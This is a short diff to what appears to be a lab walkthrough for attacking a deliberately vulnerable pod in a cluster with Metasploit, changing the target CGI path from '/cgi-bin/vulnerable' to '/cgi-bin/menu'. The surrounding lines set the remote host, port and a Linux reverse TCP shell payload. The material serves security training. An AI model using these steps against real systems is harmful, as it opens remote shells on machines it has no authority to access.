@@ -56,7 +56,7 @@ show options
 set rhost <external-ip>
 # You could also use the internal cluster IP since the metasploit pod has visibility of the vulnerable pod
 set rport 80
-set targeturi /cgi-bin/vulnerable
+set targeturi /cgi-bin/menu
 # Set the payload
 set payload linux/x86/shell/reverse_tcp
 # Check if target is vulnerable
